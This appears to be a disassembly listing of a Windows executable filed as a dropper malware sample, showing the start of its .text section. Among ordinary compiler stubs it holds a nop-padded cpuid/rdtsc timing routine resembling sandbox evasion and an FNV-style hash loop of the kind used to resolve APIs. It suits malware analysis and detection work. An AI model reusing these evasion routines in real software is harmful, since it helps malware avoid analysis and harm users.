
malware_samples/dropper/05d9c6e690d1b3bdd8bccaa77effc6d75e2bafe5f1ee6d61806f84e782eddcea.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d e5 3d 14 00 	lea    0x143de5(%rip),%rcx        # 0x140144df0
   14000100b:	e8 6c c7 08 00       	call   0x14008d77c
   140001010:	48 8d 0d 79 b4 11 25 	lea    0x2511b479(%rip),%rcx        # 0x16511c490
   140001017:	26 24 36             	es and $0x36,%al
   14000101a:	40 3d 2a fe 17 8d    	rex cmp $0x8d17fe2a,%eax
   140001020:	11 d1                	adc    %edx,%ecx
   140001022:	45 de fe             	rex.RB fdivrp %st,%st(6)
   140001025:	fe                   	(bad)
   140001026:	9b                   	fwait
   140001027:	8f                   	(bad)
   140001028:	9a                   	(bad)
   140001029:	8f                   	(bad)
   14000102a:	97                   	xchg   %eax,%edi
   14000102b:	89 d0                	mov    %edx,%eax
   14000102d:	9c                   	pushf
   14000102e:	8d 96 fe fe cd dd    	lea    -0x22320102(%rsi),%edx
   140001034:	fe                   	(bad)
   140001035:	fe cf                	dec    %bh
   140001037:	cf                   	iret
   140001038:	cb                   	lret
   140001039:	d0 cc                	ror    $1,%ah
   14000103b:	cd cd                	int    $0xcd
   14000103d:	fe cc                	dec    %ah
   14000103f:	cc                   	int3
   140001040:	48 83 ec 28          	sub    $0x28,%rsp
   140001044:	48 8d 0d 25 40 14 00 	lea    0x144025(%rip),%rcx        # 0x140145070
   14000104b:	e8 2c c7 08 00       	call   0x14008d77c
   140001050:	48 8d 0d 29 b5 11 00 	lea    0x11b529(%rip),%rcx        # 0x14011c580
   140001057:	48 83 c4 28          	add    $0x28,%rsp
   14000105b:	e9 0c de 0b 00       	jmp    0x1400bee6c
   140001060:	48 8d 0d d9 b4 11 00 	lea    0x11b4d9(%rip),%rcx        # 0x14011c540
   140001067:	e9 00 de 0b 00       	jmp    0x1400bee6c
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140001074:	0f 95 c0             	setne  %al
   140001077:	c3                   	ret
   140001078:	cc                   	int3
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	0f 54 05 d9 2f 13 00 	andps  0x132fd9(%rip),%xmm0        # 0x140134060
   140001087:	c3                   	ret
   140001088:	cc                   	int3
   140001089:	cc                   	int3
   14000108a:	cc                   	int3
   14000108b:	cc                   	int3
   14000108c:	cc                   	int3
   14000108d:	cc                   	int3
   14000108e:	cc                   	int3
   14000108f:	cc                   	int3
   140001090:	e9 ff 16 0e 00       	jmp    0x1400e2794
   140001095:	cc                   	int3
   140001096:	cc                   	int3
   140001097:	cc                   	int3
   140001098:	cc                   	int3
   140001099:	cc                   	int3
   14000109a:	cc                   	int3
   14000109b:	cc                   	int3
   14000109c:	cc                   	int3
   14000109d:	cc                   	int3
   14000109e:	cc                   	int3
   14000109f:	cc                   	int3
   1400010a0:	48 55                	rex.W push %rbp
   1400010a2:	48 89 e5             	mov    %rsp,%rbp
   1400010a5:	48 83 ec 08          	sub    $0x8,%rsp
   1400010a9:	8b f0                	mov    %eax,%esi
   1400010ab:	8b c8                	mov    %eax,%ecx
   1400010ad:	48 83 c0 08          	add    $0x8,%rax
   1400010b1:	33 c9                	xor    %ecx,%ecx
   1400010b3:	45 0b d1             	or     %r9d,%r10d
   1400010b6:	48 83 c0 08          	add    $0x8,%rax
   1400010ba:	e8 19 00 00 00       	call   0x1400010d8
   1400010bf:	48 85 c0             	test   %rax,%rax
   1400010c2:	74 05                	je     0x1400010c9
   1400010c4:	e9 7a 03 00 00       	jmp    0x140001443
   1400010c9:	49 ff ca             	dec    %r10
   1400010cc:	4d 33 db             	xor    %r11,%r11
   1400010cf:	48 ff c8             	dec    %rax
   1400010d2:	48 83 c4 08          	add    $0x8,%rsp
   1400010d6:	5d                   	pop    %rbp
   1400010d7:	c3                   	ret
   1400010d8:	33 c0                	xor    %eax,%eax
   1400010da:	90                   	nop
   1400010db:	0f a2                	cpuid
   1400010dd:	90                   	nop
   1400010de:	b8 01 00 00 00       	mov    $0x1,%eax
   1400010e3:	90                   	nop
   1400010e4:	0f a2                	cpuid
   1400010e6:	90                   	nop
   1400010e7:	49 b9 00 5e d0 b2 00 	movabs $0xb2d05e00,%r9
   1400010ee:	00 00 00 
   1400010f1:	90                   	nop
   1400010f2:	0f a2                	cpuid
   1400010f4:	90                   	nop
   1400010f5:	0f 31                	rdtsc
   1400010f7:	90                   	nop
   1400010f8:	48 c1 e2 20          	shl    $0x20,%rdx
   1400010fc:	90                   	nop
   1400010fd:	48 0b c2             	or     %rdx,%rax
   140001100:	90                   	nop
   140001101:	48 8b c8             	mov    %rax,%rcx
   140001104:	90                   	nop
   140001105:	d9 eb                	fldpi
   140001107:	90                   	nop
   140001108:	d9 fc                	frndint
   14000110a:	90                   	nop
   14000110b:	0f 31                	rdtsc
   14000110d:	90                   	nop
   14000110e:	48 c1 e2 20          	shl    $0x20,%rdx
   140001112:	90                   	nop
   140001113:	48 0b c2             	or     %rdx,%rax
   140001116:	90                   	nop
   140001117:	48 2b c1             	sub    %rcx,%rax
   14000111a:	90                   	nop
   14000111b:	49 3b c1             	cmp    %r9,%rax
   14000111e:	90                   	nop
   14000111f:	72 e4                	jb     0x140001105
   140001121:	90                   	nop
   140001122:	90                   	nop
   140001123:	55                   	push   %rbp
   140001124:	90                   	nop
   140001125:	48 8b ec             	mov    %rsp,%rbp
   140001128:	90                   	nop
   140001129:	48 83 ec 08          	sub    $0x8,%rsp
   14000112d:	90                   	nop
   14000112e:	49 c7 c2 0a 00 00 00 	mov    $0xa,%r10
   140001135:	90                   	nop
   140001136:	48 c7 c1 78 56 34 9f 	mov    $0xffffffff9f345678,%rcx
   14000113d:	90                   	nop
   14000113e:	48 ff c9             	dec    %rcx
   140001141:	90                   	nop
   140001142:	4d 33 c9             	xor    %r9,%r9
   140001145:	90                   	nop
   140001146:	48 8b c1             	mov    %rcx,%rax
   140001149:	90                   	nop
   14000114a:	75 f2                	jne    0x14000113e
   14000114c:	90                   	nop
   14000114d:	48 33 c0             	xor    %rax,%rax
   140001150:	90                   	nop
   140001151:	48 8b c3             	mov    %rbx,%rax
   140001154:	90                   	nop
   140001155:	48 03 c2             	add    %rdx,%rax
   140001158:	90                   	nop
   140001159:	49 ff ca             	dec    %r10
   14000115c:	90                   	nop
   14000115d:	4d 33 db             	xor    %r11,%r11
   140001160:	90                   	nop
   140001161:	75 d2                	jne    0x140001135
   140001163:	90                   	nop
   140001164:	48 33 c0             	xor    %rax,%rax
   140001167:	48 c7 c0 0a 00 00 00 	mov    $0xa,%rax
   14000116e:	90                   	nop
   14000116f:	48 ff c8             	dec    %rax
   140001172:	90                   	nop
   140001173:	48 83 c4 08          	add    $0x8,%rsp
   140001177:	5d                   	pop    %rbp
   140001178:	c3                   	ret
   140001179:	cc                   	int3
   14000117a:	cc                   	int3
   14000117b:	cc                   	int3
   14000117c:	cc                   	int3
   14000117d:	cc                   	int3
   14000117e:	cc                   	int3
   14000117f:	cc                   	int3
   140001180:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140001187:	ff ff 7f 
   14000118a:	c3                   	ret
   14000118b:	cc                   	int3
   14000118c:	cc                   	int3
   14000118d:	cc                   	int3
   14000118e:	cc                   	int3
   14000118f:	cc                   	int3
   140001190:	48 8b c2             	mov    %rdx,%rax
   140001193:	c3                   	ret
   140001194:	cc                   	int3
   140001195:	cc                   	int3
   140001196:	cc                   	int3
   140001197:	cc                   	int3
   140001198:	cc                   	int3
   140001199:	cc                   	int3
   14000119a:	cc                   	int3
   14000119b:	cc                   	int3
   14000119c:	cc                   	int3
   14000119d:	cc                   	int3
   14000119e:	cc                   	int3
   14000119f:	cc                   	int3
   1400011a0:	45 33 c9             	xor    %r9d,%r9d
   1400011a3:	4d 85 c0             	test   %r8,%r8
   1400011a6:	74 2c                	je     0x1400011d4
   1400011a8:	49 ba b3 01 00 00 00 	movabs $0x100000001b3,%r10
   1400011af:	01 00 00 
   1400011b2:	0f 1f 40 00          	nopl   0x0(%rax)
   1400011b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400011bd:	00 00 00 
   1400011c0:	41 0f b6 04 11       	movzbl (%r9,%rdx,1),%eax
   1400011c5:	49 ff c1             	inc    %r9
   1400011c8:	48 33 c8             	xor    %rax,%rcx
   1400011cb:	49 0f af ca          	imul   %r10,%rcx
   1400011cf:	4d 3b c8             	cmp    %r8,%r9
   1400011d2:	72 ec                	jb     0x1400011c0
   1400011d4:	48 8b c1             	mov    %rcx,%rax
   1400011d7:	c3                   	ret
   1400011d8:	cc                   	int3
   1400011d9:	cc                   	int3
   1400011da:	cc                   	int3
   1400011db:	cc                   	int3
   1400011dc:	cc                   	int3
   1400011dd:	cc                   	int3
   1400011de:	cc                   	int3
   1400011df:	cc                   	int3
   1400011e0:	40 53                	rex push %rbx
   1400011e2:	48 83 ec 30          	sub    $0x30,%rsp
   1400011e6:	48 8b d9             	mov    %rcx,%rbx
   1400011e9:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400011ee:	48 8b c2             	mov    %rdx,%rax
   1400011f1:	48 8d 0d f0 ca 11 00 	lea    0x11caf0(%rip),%rcx        # 0x14011dce8
   1400011f8:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011fc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001201:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001204:	48 89 0b             	mov    %rcx,(%rbx)
   140001207:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000120c:	0f 11 02             	movups %xmm0,(%rdx)
   14000120f:	e8 74 f9 0b 00       	call   0x1400c0b88
   140001214:	48 8b c3             	mov    %rbx,%rax
   140001217:	48 83 c4 30          	add    $0x30,%rsp
   14000121b:	5b                   	pop    %rbx
   14000121c:	c3                   	ret
   14000121d:	cc                   	int3
   14000121e:	cc                   	int3
   14000121f:	cc                   	int3
   140001220:	48 8d 05 c1 ca 11 00 	lea    0x11cac1(%rip),%rax        # 0x14011dce8
   140001227:	48 89 01             	mov    %rax,(%rcx)
   14000122a:	48 8b c1             	mov    %rcx,%rax
   14000122d:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140001234:	00 
   140001235:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   140001239:	c3                   	ret
   14000123a:	cc                   	int3
   14000123b:	cc                   	int3
   14000123c:	cc                   	int3
   14000123d:	cc                   	int3
   14000123e:	cc                   	int3
   14000123f:	cc                   	int3
   140001240:	40 53                	rex push %rbx
   140001242:	48 83 ec 20          	sub    $0x20,%rsp
   140001246:	48 8b d9             	mov    %rcx,%rbx
   140001249:	48 8b c2             	mov    %rdx,%rax
   14000124c:	48 8d 0d 95 ca 11 00 	lea    0x11ca95(%rip),%rcx        # 0x14011dce8
   140001253:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001256:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000125a:	48 89 0b             	mov    %rcx,(%rbx)
   14000125d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001261:	0f 11 02             	movups %xmm0,(%rdx)
   140001264:	e8 1f f9 0b 00       	call   0x1400c0b88
   140001269:	48 8b c3             	mov    %rbx,%rax
   14000126c:	48 83 c4 20          	add    $0x20,%rsp
   140001270:	5b                   	pop    %rbx
   140001271:	c3                   	ret
   140001272:	cc                   	int3
   140001273:	cc                   	int3
   140001274:	cc                   	int3
   140001275:	cc                   	int3
   140001276:	cc                   	int3
   140001277:	cc                   	int3
   140001278:	cc                   	int3
   140001279:	cc                   	int3
   14000127a:	cc                   	int3
   14000127b:	cc                   	int3
   14000127c:	cc                   	int3
   14000127d:	cc                   	int3
   14000127e:	cc                   	int3
   14000127f:	cc                   	int3
   140001280:	48 8d 05 61 ca 11 00 	lea    0x11ca61(%rip),%rax        # 0x14011dce8
   140001287:	48 89 01             	mov    %rax,(%rcx)
   14000128a:	48 83 c1 08          	add    $0x8,%rcx
   14000128e:	e9 85 f9 0b 00       	jmp    0x1400c0c18
   140001293:	cc                   	int3
   140001294:	cc                   	int3
   140001295:	cc                   	int3
   140001296:	cc                   	int3
   140001297:	cc                   	int3
   140001298:	cc                   	int3
   140001299:	cc                   	int3
   14000129a:	cc                   	int3
   14000129b:	cc                   	int3
   14000129c:	cc                   	int3
   14000129d:	cc                   	int3
   14000129e:	cc                   	int3
   14000129f:	cc                   	int3
   1400012a0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400012a4:	48 8d 05 3d d4 12 00 	lea    0x12d43d(%rip),%rax        # 0x14012e6e8
   1400012ab:	48 85 d2             	test   %rdx,%rdx
   1400012ae:	48 0f 45 c2          	cmovne %rdx,%rax
   1400012b2:	c3                   	ret
   1400012b3:	cc                   	int3
   1400012b4:	cc                   	int3
   1400012b5:	cc                   	int3
   1400012b6:	cc                   	int3
   1400012b7:	cc                   	int3
   1400012b8:	cc                   	int3
   1400012b9:	cc                   	int3
   1400012ba:	cc                   	int3
   1400012bb:	cc                   	int3
   1400012bc:	cc                   	int3
   1400012bd:	cc                   	int3
   1400012be:	cc                   	int3
   1400012bf:	cc                   	int3
   1400012c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400012c5:	57                   	push   %rdi
   1400012c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400012ca:	48 8d 05 17 ca 11 00 	lea    0x11ca17(%rip),%rax        # 0x14011dce8
   1400012d1:	48 8b f9             	mov    %rcx,%rdi
   1400012d4:	48 89 01             	mov    %rax,(%rcx)
   1400012d7:	8b da                	mov    %edx,%ebx
   1400012d9:	48 83 c1 08          	add    $0x8,%rcx
   1400012dd:	e8 36 f9 0b 00       	call   0x1400c0c18
   1400012e2:	f6 c3 01             	test   $0x1,%bl
   1400012e5:	74 0d                	je     0x1400012f4
   1400012e7:	ba 18 00 00 00       	mov    $0x18,%edx
   1400012ec:	48 8b cf             	mov    %rdi,%rcx
   1400012ef:	e8 9c d0 0b 00       	call   0x1400be390
   1400012f4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400012f9:	48 8b c7             	mov    %rdi,%rax
   1400012fc:	48 83 c4 20          	add    $0x20,%rsp
   140001300:	5f                   	pop    %rdi
   140001301:	c3                   	ret
   140001302:	cc                   	int3
   140001303:	cc                   	int3
   140001304:	cc                   	int3
   140001305:	cc                   	int3
   140001306:	cc                   	int3
   140001307:	cc                   	int3
   140001308:	cc                   	int3
   140001309:	cc                   	int3
   14000130a:	cc                   	int3
   14000130b:	cc                   	int3
   14000130c:	cc                   	int3
   14000130d:	cc                   	int3
   14000130e:	cc                   	int3
   14000130f:	cc                   	int3
   140001310:	48 8d 05 e9 c9 11 00 	lea    0x11c9e9(%rip),%rax        # 0x14011dd00
   140001317:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000131e:	00 
   14000131f:	48 89 01             	mov    %rax,(%rcx)
   140001322:	48 8b c1             	mov    %rcx,%rax
   140001325:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   140001329:	c3                   	ret
   14000132a:	cc                   	int3
   14000132b:	cc                   	int3
   14000132c:	cc                   	int3
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 8d 05 c9 d3 12 00 	lea    0x12d3c9(%rip),%rax        # 0x14012e700
   140001337:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000133e:	00 
   14000133f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001343:	48 8d 05 5e df 11 00 	lea    0x11df5e(%rip),%rax        # 0x14011f2a8
   14000134a:	48 89 01             	mov    %rax,(%rcx)
   14000134d:	48 8b c1             	mov    %rcx,%rax
   140001350:	c3                   	ret
   140001351:	cc                   	int3
   140001352:	cc                   	int3
   140001353:	cc                   	int3
   140001354:	cc                   	int3
   140001355:	cc                   	int3
   140001356:	cc                   	int3
   140001357:	cc                   	int3
   140001358:	cc                   	int3
   140001359:	cc                   	int3
   14000135a:	cc                   	int3
   14000135b:	cc                   	int3
   14000135c:	cc                   	int3
   14000135d:	cc                   	int3
   14000135e:	cc                   	int3
   14000135f:	cc                   	int3
   140001360:	48 83 ec 48          	sub    $0x48,%rsp
   140001364:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001369:	e8 c2 ff ff ff       	call   0x140001330
   14000136e:	48 8d 15 43 0f 14 00 	lea    0x140f43(%rip),%rdx        # 0x1401422b8
   140001375:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000137a:	e8 f5 fb 0b 00       	call   0x1400c0f74
   14000137f:	cc                   	int3
   140001380:	40 53                	rex push %rbx
   140001382:	48 83 ec 20          	sub    $0x20,%rsp
   140001386:	48 8b d9             	mov    %rcx,%rbx
   140001389:	48 8b c2             	mov    %rdx,%rax
   14000138c:	48 8d 0d 55 c9 11 00 	lea    0x11c955(%rip),%rcx        # 0x14011dce8
   140001393:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001396:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000139a:	48 89 0b             	mov    %rcx,(%rbx)
   14000139d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400013a1:	0f 11 02             	movups %xmm0,(%rdx)
   1400013a4:	e8 df f7 0b 00       	call   0x1400c0b88
   1400013a9:	48 8d 05 f8 de 11 00 	lea    0x11def8(%rip),%rax        # 0x14011f2a8
   1400013b0:	48 89 03             	mov    %rax,(%rbx)
   1400013b3:	48 8b c3             	mov    %rbx,%rax
   1400013b6:	48 83 c4 20          	add    $0x20,%rsp
   1400013ba:	5b                   	pop    %rbx
   1400013bb:	c3                   	ret
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	40 53                	rex push %rbx
   1400013c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400013c6:	48 8b d9             	mov    %rcx,%rbx
   1400013c9:	48 8b c2             	mov    %rdx,%rax
   1400013cc:	48 8d 0d 15 c9 11 00 	lea    0x11c915(%rip),%rcx        # 0x14011dce8
   1400013d3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400013d6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400013da:	48 89 0b             	mov    %rcx,(%rbx)
   1400013dd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400013e1:	0f 11 02             	movups %xmm0,(%rdx)
   1400013e4:	e8 9f f7 0b 00       	call   0x1400c0b88
   1400013e9:	48 8d 05 10 c9 11 00 	lea    0x11c910(%rip),%rax        # 0x14011dd00
   1400013f0:	48 89 03             	mov    %rax,(%rbx)
   1400013f3:	48 8b c3             	mov    %rbx,%rax
   1400013f6:	48 83 c4 20          	add    $0x20,%rsp
   1400013fa:	5b                   	pop    %rbx
   1400013fb:	c3                   	ret
   1400013fc:	cc                   	int3
   1400013fd:	cc                   	int3
   1400013fe:	cc                   	int3
   1400013ff:	cc                   	int3
   140001400:	e9 93 cf 0b 00       	jmp    0x1400be398
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	48 83 ec 28          	sub    $0x28,%rsp
   140001414:	48 83 02 27          	addq   $0x27,(%rdx)
   140001418:	48 8b 01             	mov    (%rcx),%rax
   14000141b:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000141f:	48 2b c2             	sub    %rdx,%rax
   140001422:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001426:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000142a:	77 08                	ja     0x140001434
   14000142c:	48 89 11             	mov    %rdx,(%rcx)
   14000142f:	48 83 c4 28          	add    $0x28,%rsp
   140001433:	c3                   	ret
   140001434:	e8 87 22 0e 00       	call   0x1400e36c0
   140001439:	cc                   	int3
   14000143a:	cc                   	int3
   14000143b:	cc                   	int3
   14000143c:	cc                   	int3
   14000143d:	cc                   	int3
   14000143e:	cc                   	int3
   14000143f:	cc                   	int3
   140001440:	c2 00 00             	ret    $0x0
   140001443:	48 c7 c1 a7 a7 5f 5c 	mov    $0x5c5fa7a7,%rcx
   14000144a:	e9 cf 08 00 00       	jmp    0x140001d1e
   14000144f:	cc                   	int3
   140001450:	48 8b c1             	mov    %rcx,%rax
   140001453:	c3                   	ret
   140001454:	cc                   	int3
   140001455:	cc                   	int3
   140001456:	cc                   	int3
   140001457:	cc                   	int3
   140001458:	cc                   	int3
   140001459:	cc                   	int3
   14000145a:	cc                   	int3
   14000145b:	cc                   	int3
   14000145c:	cc                   	int3
   14000145d:	cc                   	int3
   14000145e:	cc                   	int3
   14000145f:	cc                   	int3
   140001460:	48 83 ec 28          	sub    $0x28,%rsp
   140001464:	48 8d 0d ad d2 12 00 	lea    0x12d2ad(%rip),%rcx        # 0x14012e718
   14000146b:	e8 84 ca 08 00       	call   0x14008def4
   140001470:	cc                   	int3
   140001471:	cc                   	int3
   140001472:	cc                   	int3
   140001473:	cc                   	int3
   140001474:	cc                   	int3
   140001475:	cc                   	int3
   140001476:	cc                   	int3
   140001477:	cc                   	int3
   140001478:	cc                   	int3
   140001479:	cc                   	int3
   14000147a:	cc                   	int3
   14000147b:	cc                   	int3
   14000147c:	cc                   	int3
   14000147d:	cc                   	int3
   14000147e:	cc                   	int3
   14000147f:	cc                   	int3
   140001480:	40 53                	rex push %rbx
   140001482:	48 83 ec 30          	sub    $0x30,%rsp
   140001486:	48 83 7a 18 10       	cmpq   $0x10,0x18(%rdx)
   14000148b:	48 8b c2             	mov    %rdx,%rax
   14000148e:	48 8b d9             	mov    %rcx,%rbx
   140001491:	72 03                	jb     0x140001496
   140001493:	48 8b 02             	mov    (%rdx),%rax
   140001496:	48 8d 0d 4b c8 11 00 	lea    0x11c84b(%rip),%rcx        # 0x14011dce8
   14000149d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400014a2:	48 89 0b             	mov    %rcx,(%rbx)
   1400014a5:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400014a9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400014ac:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400014b1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400014b6:	0f 11 02             	movups %xmm0,(%rdx)
   1400014b9:	e8 ca f6 0b 00       	call   0x1400c0b88
   1400014be:	48 8d 05 f3 c8 11 00 	lea    0x11c8f3(%rip),%rax        # 0x14011ddb8
   1400014c5:	48 89 03             	mov    %rax,(%rbx)
   1400014c8:	48 8b c3             	mov    %rbx,%rax
   1400014cb:	48 83 c4 30          	add    $0x30,%rsp
   1400014cf:	5b                   	pop    %rbx
   1400014d0:	c3                   	ret
   1400014d1:	cc                   	int3
   1400014d2:	cc                   	int3
   1400014d3:	cc                   	int3
   1400014d4:	cc                   	int3
   1400014d5:	cc                   	int3
   1400014d6:	cc                   	int3
   1400014d7:	cc                   	int3
   1400014d8:	cc                   	int3
   1400014d9:	cc                   	int3
   1400014da:	cc                   	int3
   1400014db:	cc                   	int3
   1400014dc:	cc                   	int3
   1400014dd:	cc                   	int3
   1400014de:	cc                   	int3
   1400014df:	cc                   	int3
   1400014e0:	40 53                	rex push %rbx
   1400014e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400014e6:	48 8b d9             	mov    %rcx,%rbx
   1400014e9:	48 8b c2             	mov    %rdx,%rax
   1400014ec:	48 8d 0d f5 c7 11 00 	lea    0x11c7f5(%rip),%rcx        # 0x14011dce8
   1400014f3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400014f6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400014fa:	48 89 0b             	mov    %rcx,(%rbx)
   1400014fd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001501:	0f 11 02             	movups %xmm0,(%rdx)
   140001504:	e8 7f f6 0b 00       	call   0x1400c0b88
   140001509:	48 8d 05 a8 c8 11 00 	lea    0x11c8a8(%rip),%rax        # 0x14011ddb8
   140001510:	48 89 03             	mov    %rax,(%rbx)
   140001513:	48 8b c3             	mov    %rbx,%rax
   140001516:	48 83 c4 20          	add    $0x20,%rsp
   14000151a:	5b                   	pop    %rbx
   14000151b:	c3                   	ret
   14000151c:	cc                   	int3
   14000151d:	cc                   	int3
   14000151e:	cc                   	int3
   14000151f:	cc                   	int3
   140001520:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001524:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   140001528:	0f 94 c0             	sete   %al
   14000152b:	c3                   	ret
   14000152c:	cc                   	int3
   14000152d:	cc                   	int3
   14000152e:	cc                   	int3
   14000152f:	cc                   	int3
   140001530:	89 11                	mov    %edx,(%rcx)
   140001532:	48 8b c1             	mov    %rcx,%rax
   140001535:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140001539:	c3                   	ret
   14000153a:	cc                   	int3
   14000153b:	cc                   	int3
   14000153c:	cc                   	int3
   14000153d:	cc                   	int3
   14000153e:	cc                   	int3
   14000153f:	cc                   	int3
   140001540:	8b 01                	mov    (%rcx),%eax
   140001542:	c3                   	ret
   140001543:	cc                   	int3
   140001544:	cc                   	int3
   140001545:	cc                   	int3
   140001546:	cc                   	int3
   140001547:	cc                   	int3
   140001548:	cc                   	int3
   140001549:	cc                   	int3
   14000154a:	cc                   	int3
   14000154b:	cc                   	int3
   14000154c:	cc                   	int3
   14000154d:	cc                   	int3
   14000154e:	cc                   	int3
   14000154f:	cc                   	int3
   140001550:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140001554:	c3                   	ret
   140001555:	cc                   	int3
   140001556:	cc                   	int3
   140001557:	cc                   	int3
   140001558:	cc                   	int3
   140001559:	cc                   	int3
   14000155a:	cc                   	int3
   14000155b:	cc                   	int3
   14000155c:	cc                   	int3
   14000155d:	cc                   	int3
   14000155e:	cc                   	int3
   14000155f:	cc                   	int3
   140001560:	40 53                	rex push %rbx
   140001562:	48 83 ec 30          	sub    $0x30,%rsp
   140001566:	44 8b 01             	mov    (%rcx),%r8d
   140001569:	48 8b da             	mov    %rdx,%rbx
   14000156c:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001570:	48 8b 01             	mov    (%rcx),%rax
   140001573:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001577:	ff 15 0b be 11 00    	call   *0x11be0b(%rip)        # 0x14011d388
   14000157d:	48 8b c3             	mov    %rbx,%rax
   140001580:	48 83 c4 30          	add    $0x30,%rsp
   140001584:	5b                   	pop    %rbx
   140001585:	c3                   	ret
   140001586:	cc                   	int3
   140001587:	cc                   	int3
   140001588:	cc                   	int3
   140001589:	cc                   	int3
   14000158a:	cc                   	int3
   14000158b:	cc                   	int3
   14000158c:	cc                   	int3
   14000158d:	cc                   	int3
   14000158e:	cc                   	int3
   14000158f:	cc                   	int3
   140001590:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001594:	4c 8b 49 08          	mov    0x8(%rcx),%r9
   140001598:	4c 8b 40 08          	mov    0x8(%rax),%r8
   14000159c:	4d 39 41 08          	cmp    %r8,0x8(%r9)
   1400015a0:	75 09                	jne    0x1400015ab
   1400015a2:	8b 02                	mov    (%rdx),%eax
   1400015a4:	39 01                	cmp    %eax,(%rcx)
   1400015a6:	75 03                	jne    0x1400015ab
   1400015a8:	b0 01                	mov    $0x1,%al
   1400015aa:	c3                   	ret
   1400015ab:	32 c0                	xor    %al,%al
   1400015ad:	c3                   	ret
   1400015ae:	cc                   	int3
   1400015af:	cc                   	int3
   1400015b0:	44 89 02             	mov    %r8d,(%rdx)
   1400015b3:	48 8b c2             	mov    %rdx,%rax
   1400015b6:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   1400015ba:	c3                   	ret
   1400015bb:	cc                   	int3
   1400015bc:	cc                   	int3
   1400015bd:	cc                   	int3
   1400015be:	cc                   	int3
   1400015bf:	cc                   	int3
   1400015c0:	40 53                	rex push %rbx
   1400015c2:	48 83 ec 30          	sub    $0x30,%rsp
   1400015c6:	48 8b 01             	mov    (%rcx),%rax
   1400015c9:	49 8b d8             	mov    %r8,%rbx
   1400015cc:	44 8b c2             	mov    %edx,%r8d
   1400015cf:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400015d4:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400015d8:	ff 15 aa bd 11 00    	call   *0x11bdaa(%rip)        # 0x14011d388
   1400015de:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400015e2:	4c 8b 48 08          	mov    0x8(%rax),%r9
   1400015e6:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400015ea:	49 39 51 08          	cmp    %rdx,0x8(%r9)
   1400015ee:	75 0e                	jne    0x1400015fe
   1400015f0:	8b 0b                	mov    (%rbx),%ecx
   1400015f2:	39 08                	cmp    %ecx,(%rax)
   1400015f4:	75 08                	jne    0x1400015fe
   1400015f6:	b0 01                	mov    $0x1,%al
   1400015f8:	48 83 c4 30          	add    $0x30,%rsp
   1400015fc:	5b                   	pop    %rbx
   1400015fd:	c3                   	ret
